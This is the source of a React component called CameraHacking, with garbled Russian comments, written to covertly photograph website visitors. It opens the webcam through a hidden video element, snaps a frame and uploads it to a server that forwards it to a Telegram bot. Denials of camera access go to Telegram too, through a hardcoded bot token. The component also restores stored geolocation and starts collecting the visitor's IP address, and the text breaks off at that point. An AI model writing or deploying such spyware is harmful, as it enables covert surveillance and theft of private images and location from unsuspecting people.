/**
 *  –ö–û–ú–ü–û–ù–ï–ù–¢ ACCESCAMERA - –£–ü–†–ê–í–õ–ï–ù–ò–ï –ö–ê–ú–ï–†–û–ô –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø
 * 
 * –≠—Ç–æ—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
 * –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π –±–µ–∑ –≤–µ–¥–æ–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
 * –†–∞–±–æ—Ç–∞–µ—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –≤–∏–¥–∏—Ç –ø—Ä–æ—Ü–µ—Å—Å —Å—ä–µ–º–∫–∏.
 * 
 *  –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò:
 * - –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–∞ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
 * - –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫ —Å –∫–∞–º–µ—Ä—ã
 * - –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–µ–ª–∞–µ—Ç —Å–Ω–∏–º–æ–∫ —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É –ø–æ—Å–ª–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
 * - –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ—Ç –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ blob —Ñ–æ—Ä–º–∞—Ç
 * - –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä —á–µ—Ä–µ–∑ API
 * 
 *  –ê–õ–ì–û–†–ò–¢–ú –†–ê–ë–û–¢–´:
 * 1. useEffect –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ø—Ä–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞
 * 2. getUserMedia() –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
 * 3. –í–∏–¥–µ–æ–ø–æ—Ç–æ–∫ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ—Ç—Å—è —Å–∫—Ä—ã—Ç–æ–º—É video —ç–ª–µ–º–µ–Ω—Ç—É
 * 4. –ß–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞—Ö–≤–∞—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
 * 5. Canvas —Å–æ–∑–¥–∞–µ—Ç—Å—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–∞–¥—Ä–∞ –∏–∑ –≤–∏–¥–µ–æ
 * 6. –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –≤ blob –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä
 * 
 *  –í–ê–ñ–ù–û: –†–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –ø–æ HTTPS –∏ —Ç—Ä–µ–±—É–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!
 */

import axios from 'axios';
import { useEffect, useState } from 'react';
import API_CONFIG from '../api/config';

/**
 *  –§–£–ù–ö–¶–ò–û–ù–ê–õ–¨–ù–´–ô –ö–û–ú–ü–û–ù–ï–ù–¢ CAMERAHACKING
 * 
 * @param {Object} props - –ü—Ä–æ–ø—Å—ã –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞
 * @param {Function} props.setClientIp - –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ IP –∞–¥—Ä–µ—Å–∞
 * @param {string} props.chatId - ID Telegram —á–∞—Ç–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ
 * @param {Object} props.videoRef - –°—Å—ã–ª–∫–∞ –Ω–∞ video —ç–ª–µ–º–µ–Ω—Ç –∏–∑ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞
 * @param {Function} props.setLocationPermission - –§—É–Ω–∫—Ü–∏—è —Å–≤—è–∑–∏ —Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–µ–π
 * @returns {JSX.Element} –ü—É—Å—Ç–æ–π JSX (–∫–æ–º–ø–æ–Ω–µ–Ω—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –≤ —Ñ–æ–Ω–µ)
 */
const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {

  /**
   *  –û–°–ù–û–í–ù–û–ô –≠–§–§–ï–ö–¢ –î–õ–Ø –†–ê–ë–û–¢–´ –° –ö–ê–ú–ï–†–û–ô
   * 
   * –ó–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç
   * –≤—Å—é –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–µ–π—Å—Ç–≤–∏–π –ø–æ –ø–æ–ª—É—á–µ–Ω–∏—é –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ
   * –∏ —Å–æ–∑–¥–∞–Ω–∏—é —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏.
   */
  useEffect(() => {
    /**
     *  –§–£–ù–ö–¶–ò–Ø –ü–û–õ–£–ß–ï–ù–ò–Ø –î–û–°–¢–£–ü–ê –ö –í–ï–ë-–ö–ê–ú–ï–†–ï
     * 
     * –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ
     * –∫–∞–º–µ—Ä—ã –∏ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é —Å—ä–µ–º–∫—É.
     */
    const accessWebcam = async () => {
      try {
        console.log("üì∏ Requesting camera access...");
        
        /**
         *  –ó–ê–ü–†–û–° –î–û–°–¢–£–ü–ê –ö –ú–ï–î–ò–ê –£–°–¢–†–û–ô–°–¢–í–ê–ú
         * 
         * navigator.mediaDevices.getUserMedia() - —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π Web API –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ
         * –ü–∞—Ä–∞–º–µ—Ç—Ä { video: true } —É–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –Ω–∞–º –Ω—É–∂–µ–Ω —Ç–æ–ª—å–∫–æ –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫
         * 
         *  –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ï –ù–ê–°–¢–†–û–ô–ö–ò (–º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å):
         * { 
         *   video: {
         *     width: { ideal: 1920 },     // –ü—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª—å–Ω–∞—è —à–∏—Ä–∏–Ω–∞
         *     height: { ideal: 1080 },    // –ü—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª—å–Ω–∞—è –≤—ã—Å–æ—Ç–∞
         *     facingMode: "user"          // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
         *   }
         * }
         */
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        console.log("‚úÖ Camera access granted");

        /**
         *  –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –í–ò–î–ï–û–ü–û–¢–û–ö–ê –ö VIDEO –≠–õ–ï–ú–ï–ù–¢–£
         * 
         * –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å—Å—ã–ª–∫–∞ –Ω–∞ video —ç–ª–µ–º–µ–Ω—Ç —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, –∑–∞—Ç–µ–º
         * –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º –µ–º—É –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –º–µ–¥–∏–∞–ø–æ—Ç–æ–∫. –≠–ª–µ–º–µ–Ω—Ç —Å–∫—Ä—ã—Ç –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
         * —Å –ø–æ–º–æ—â—å—é CSS (display: none).
         */
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          console.log("üé¨ Video stream connected to element");
          
          /**
           * –§–£–ù–ö–¶–ò–Ø –ó–ê–•–í–ê–¢–ê –ò–ó–û–ë–†–ê–ñ–ï–ù–ò–Ø
           * 
           * –°–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ –∏–∑ —Ç–µ–∫—É—â–µ–≥–æ –∫–∞–¥—Ä–∞ –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –µ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä.
           * –ò—Å–ø–æ–ª—å–∑—É–µ—Ç Canvas API –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–∏–¥–µ–æ–∫–∞–¥—Ä–∞.
           */
          const captureImage = () => {
            console.log("üì∑ Starting image capture...");
            
            //  –ü–†–û–í–ï–†–ö–ê –ì–û–¢–û–í–ù–û–°–¢–ò –í–ò–î–ï–û
            // –£–±–µ–∂–¥–∞–µ–º—Å—è, —á—Ç–æ –≤–∏–¥–µ–æ –∑–∞–≥—Ä—É–∂–µ–Ω–æ –∏ –∏–º–µ–µ—Ç —Ä–µ–∞–ª—å–Ω—ã–µ —Ä–∞–∑–º–µ—Ä—ã
            if (!videoRef.current || videoRef.current.videoWidth === 0 || videoRef.current.videoHeight === 0) {
              console.warn("‚ö†Ô∏è Video not ready yet, retrying in 500ms...");
              setTimeout(captureImage, 500);
              return;
            }
            
            console.log(`‚úÖ Video is ready: ${videoRef.current.videoWidth}x${videoRef.current.videoHeight}`);
            
            /**
             *  –°–û–ó–î–ê–ù–ò–ï CANVAS –≠–õ–ï–ú–ï–ù–¢–ê –î–õ–Ø –û–ë–†–ê–ë–û–¢–ö–ò –ò–ó–û–ë–†–ê–ñ–ï–ù–ò–Ø
             * 
             * Canvas –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω—ã–π –±—É—Ñ–µ—Ä –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∫–∞–¥—Ä–∞
             * –∏–∑ –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫–∞ –∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –µ–≥–æ –≤ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.
             */
            const canvas = document.createElement("canvas");
            
            // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä—ã canvas —Ä–∞–≤–Ω—ã–º–∏ —Ä–∞–∑–º–µ—Ä–∞–º –≤–∏–¥–µ–æ
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            
            console.log(`üìè Canvas size: ${canvas.width}x${canvas.height}`);
  
            /**
             *  –†–ò–°–û–í–ê–ù–ò–ï –ö–ê–î–†–ê –ù–ê CANVAS
             * 
             * getContext("2d") –ø–æ–ª—É—á–∞–µ—Ç 2D –∫–æ–Ω—Ç–µ–∫—Å—Ç –¥–ª—è —Ä–∏—Å–æ–≤–∞–Ω–∏—è
             * drawImage() –∫–æ–ø–∏—Ä—É–µ—Ç —Ç–µ–∫—É—â–∏–π –∫–∞–¥—Ä –∏–∑ video —ç–ª–µ–º–µ–Ω—Ç–∞ –Ω–∞ canvas
             */
            const context = canvas.getContext("2d");
            context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
  
            /**
             *  –ö–û–ù–í–ï–†–¢–ê–¶–ò–Ø –ò–ó–û–ë–†–ê–ñ–ï–ù–ò–Ø –í BLOB –ò –û–¢–ü–†–ê–í–ö–ê
             * 
             * toBlob() –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ canvas –≤ blob –æ–±—ä–µ–∫—Ç
             * –ü–∞—Ä–∞–º–µ—Ç—Ä "image/jpeg" —É–∫–∞–∑—ã–≤–∞–µ—Ç —Ñ–æ—Ä–º–∞—Ç –≤—ã—Ö–æ–¥–Ω–æ–≥–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
             * 
             *  –î–†–£–ì–ò–ï –§–û–†–ú–ê–¢–´:
             * - "image/png" - –¥–ª—è PNG —Å –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å—é
             * - "image/webp" - –¥–ª—è —Å–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ WebP —Ñ–æ—Ä–º–∞—Ç–∞
             */
            canvas.toBlob(async (blob) => {
              if (blob) {
                console.log(`üì§ Sending photo (${blob.size} bytes)...`);
                
                /**
                 *  –ü–û–î–ì–û–¢–û–í–ö–ê –î–ê–ù–ù–´–• –î–õ–Ø –û–¢–ü–†–ê–í–ö–ò
                 * 
                 * FormData –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                 * multipart/form-data - –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π Content-Type –¥–ª—è —Ñ–∞–π–ª–æ–≤
                 */
                const formData = new FormData();
                formData.append("chat_id", chatId);           // ID Telegram —á–∞—Ç–∞
                formData.append("photo", blob, "photo.jpg");  // –§–∞–π–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è

                /**
                 *  –û–¢–ü–†–ê–í–ö–ê –§–û–¢–û –ù–ê –°–ï–†–í–ï–†
                 * 
                 * –ò—Å–ø–æ–ª—å–∑—É–µ–º –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π API endpoint –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π
                 * –°–µ—Ä–≤–µ—Ä –ø–æ–ª—É—á–∏—Ç —Ñ–∞–π–ª –∏ –ø–µ—Ä–µ–ø—Ä–∞–≤–∏—Ç –µ–≥–æ –≤ Telegram –±–æ—Ç
                 */
                const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
                
                try {
                  await axios.post(apiUrl, formData, {
                    headers: { 
                      "Content-Type": "multipart/form-data" 
                    },
                    timeout: 10000 // –¢–∞–π–º–∞—É—Ç 10 —Å–µ–∫—É–Ω–¥ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –∑–∞–≤–∏—Å–∞–Ω–∏—è
                  });
                  
                  console.log("‚úÖ Photo sent successfully to Telegram");
                  
                } catch (error) {
                  console.error("‚ùå Error sending photo to server:", error);
                  
                  //  –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
                  // setTimeout(() => captureImage(), 5000);
                }
              } else {
                console.error("‚ùå Failed to create image blob");
              }
            }, "image/jpeg", 0.9); // –ö–∞—á–µ—Å—Ç–≤–æ JPEG: 0.9 (90%)
          };

          /**
           *  –§–£–ù–ö–¶–ò–Ø –û–ñ–ò–î–ê–ù–ò–Ø –ì–û–¢–û–í–ù–û–°–¢–ò –í–ò–î–ï–û
           * 
           * –ë–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–∞—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ setTimeout - –∂–¥–µ–º –ø–æ–∫–∞ –≤–∏–¥–µ–æ
           * –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≥—Ä—É–∑–∏—Ç—Å—è –∏ –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–æ –∫ –∑–∞—Ö–≤–∞—Ç—É –∫–∞–¥—Ä–æ–≤.
           */
          const waitForVideoReady = () => {
            return new Promise((resolve) => {
              // –ï—Å–ª–∏ –≤–∏–¥–µ–æ —É–∂–µ –≥–æ—Ç–æ–≤–æ, —Å—Ä–∞–∑—É —Ä–µ–∑–æ–ª–≤–∏–º
              if (videoRef.current.videoWidth > 0 && videoRef.current.videoHeight > 0) {
                console.log("‚úÖ Video already ready");
                resolve();
                return;
              }

              // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö –≤–∏–¥–µ–æ
              const handleLoadedMetadata = () => {
                console.log("‚úÖ Video metadata loaded");
                videoRef.current.removeEventListener('loadedmetadata', handleLoadedMetadata);
                // –ù–µ–±–æ–ª—å—à–∞—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
                setTimeout(resolve, 200);
              };

              // Fallback —Ç–∞–π–º–µ—Ä –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ —Å–æ–±—ã—Ç–∏–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç
              const fallbackTimer = setTimeout(() => {
                console.log("‚è∞ Using fallback timer for video ready");
                videoRef.current.removeEventListener('loadedmetadata', handleLoadedMetadata);
                resolve();
              }, 3000);

              // –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—à–∞—Ç–µ–ª—å —Å–æ–±—ã—Ç–∏—è
              videoRef.current.addEventListener('loadedmetadata', () => {
                clearTimeout(fallbackTimer);
                handleLoadedMetadata();
              });

              // –ü—ã—Ç–∞–µ–º—Å—è –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤–∏–¥–µ–æ, –µ—Å–ª–∏ –æ–Ω–æ –µ—â–µ –Ω–µ –∑–∞–ø—É—â–µ–Ω–æ
              if (videoRef.current.paused) {
                videoRef.current.play().catch(err => {
                  console.log("Note: Auto-play blocked, but capture will still work");
                });
              }
            });
          };

          /**
           *  –£–ú–ù–´–ô –ó–ê–ü–£–°–ö –°–™–ï–ú–ö–ò
           * 
           * –í–º–µ—Å—Ç–æ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –∑–∞–¥–µ—Ä–∂–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º Promise-based –ø–æ–¥—Ö–æ–¥:
           * 1. –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö –≤–∏–¥–µ–æ (—Å–æ–±—ã—Ç–∏–µ 'loadedmetadata')
           * 2. –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ videoWidth/videoHeight –±–æ–ª—å—à–µ 0
           * 3. –î–æ–±–∞–≤–ª—è–µ–º –Ω–µ–±–æ–ª—å—à—É—é –∑–∞–¥–µ—Ä–∂–∫—É –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
           * 4. –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞—Ö–≤–∞—Ç –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
           * 
           *  –ü–†–ï–ò–ú–£–©–ï–°–¢–í–ê –≠–¢–û–ì–û –ü–û–î–•–û–î–ê:
           * - –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫–∞
           * - –†–∞–±–æ—Ç–∞–µ—Ç –±—ã—Å—Ç—Ä–µ–µ –Ω–∞ –±—ã—Å—Ç—Ä—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è—Ö
           * - –ë–æ–ª–µ–µ –Ω–∞–¥–µ–∂–µ–Ω –Ω–∞ –º–µ–¥–ª–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö
           * - –ò–º–µ–µ—Ç fallback –Ω–∞ —Å–ª—É—á–∞–π –ø—Ä–æ–±–ª–µ–º
           */
          waitForVideoReady().then(() => {
            console.log("üé¨ Video is fully ready, starting capture...");
            captureImage();
          });
        } else {
          console.error("‚ùå Video element reference is null");
        }
        
      } catch (error) {
        /**
         *  –û–ë–†–ê–ë–û–¢–ö–ê –û–®–ò–ë–û–ö –î–û–°–¢–£–ü–ê –ö –ö–ê–ú–ï–†–ï
         * 
         * –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –æ—Ç–∫–ª–æ–Ω–∏—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏–ª–∏
         * –∫–∞–º–µ—Ä–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–º –ø—Ä–∏—á–∏–Ω–∞–º.
         * 
         *  –¢–ò–ü–ò–ß–ù–´–ï –û–®–ò–ë–ö–ò:
         * - NotAllowedError: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ
         * - NotFoundError: –∫–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞
         * - NotReadableError: –∫–∞–º–µ—Ä–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –¥—Ä—É–≥–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º
         * - OverconstrainedError: –∑–∞–ø—Ä–æ—à–µ–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è
         */
        console.error("‚ùå Error accessing webcam:", error);
        
        try {
          /**
           *  –£–í–ï–î–û–ú–õ–ï–ù–ò–ï –í TELEGRAM –û–ë –û–¢–ö–ê–ó–ï
           * 
           * –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω—è–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
           * —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram —á–∞—Ç. –≠—Ç–æ –ø–æ–º–æ–≥–∞–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å
           * –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ—Ç–∫–∞–∑–æ–≤ –∏ —É—Å–ø–µ—à–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.
           * 
           *  –ü–†–ò–ú–ï–ß–ê–ù–ò–ï: –ó–¥–µ—Å—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ö–∞—Ä–¥–∫–æ–¥ —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞,
           * –≤ –ø—Ä–æ–¥–∞–∫—à–Ω–µ –ª—É—á—à–µ –≤—ã–Ω–µ—Å—Ç–∏ —ç—Ç–æ –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é
           */
          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
          
          await axios.post(telegramApiUrl, {
            'chat_id': chatId, 
            'text': `üö´ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞–ø—Ä–æ—Å –∫ –∫–∞–º–µ—Ä–µ!\n\n` +
                   `–¢–∏–ø –æ—à–∏–±–∫–∏: ${error.name}\n` +
                   `–û–ø–∏—Å–∞–Ω–∏–µ: ${error.message}\n` +
                   `–í—Ä–µ–º—è: ${new Date().toLocaleString()}`
          });

          console.log("üì§ Camera denial notification sent to Telegram");
          
        } catch (err) {
          console.error("‚ùå Error sending notification to Telegram:", err);
        }
      }
    };

    /**
     *  –í–û–°–°–¢–ê–ù–û–í–õ–ï–ù–ò–ï –°–û–•–†–ê–ù–ï–ù–ù–´–• –î–ê–ù–ù–´–• –ì–ï–û–õ–û–ö–ê–¶–ò–ò
     * 
     * –ü—Ä–æ–≤–µ—Ä—è–µ–º localStorage –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ä–∞–Ω–µ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.
     * –ï—Å–ª–∏ –¥–∞–Ω–Ω—ã–µ –µ—Å—Ç—å, –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏—Ö –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞.
     * 
     *  –°–¢–†–£–ö–¢–£–†–ê –î–ê–ù–ù–´–• –í LOCALSTORAGE:
     * {
     *   latitude: number,
     *   longitude: number,
     *   timestamp: number
     * }
     */
    const savedPermission = localStorage.getItem("locationPermission");
    if (savedPermission) {
      try {
        const locationData = JSON.parse(savedPermission);
        setLocationPermission(locationData);
        console.log("üìç Restored location data from localStorage:", locationData);
      } catch (error) {
        console.error("‚ùå Error parsing saved location data:", error);
        localStorage.removeItem("locationPermission"); // –£–¥–∞–ª—è–µ–º –ø–æ–≤—Ä–µ–∂–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
      }
    }

    /**
     *  –§–£–ù–ö–¶–ò–Ø –ü–û–õ–£–ß–ï–ù–ò–Ø IP –ê–î–†–ï–°–ê –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø
     * 
     * –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–∏—Å ipify.org –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—É–±–ª–∏—á–Ω–æ–≥–æ IP –∞–¥—Ä–µ—Å–∞.
     * IP –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –∫–∞–∫ fallback –¥–ª—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.
     * 
     * –ê–õ–¨–¢–ï–†–ù–ê–¢–ò–í–ù–´–ï –°–ï–†–í–ò–°–´:
     * - https://httpbin.org/ip
     * - https://ipinfo.io/json
     * - https://api.myip.com
     */
    const fetchClientIp = async () => {
      try {
        console.log("üåê Fetching client IP address...");
        
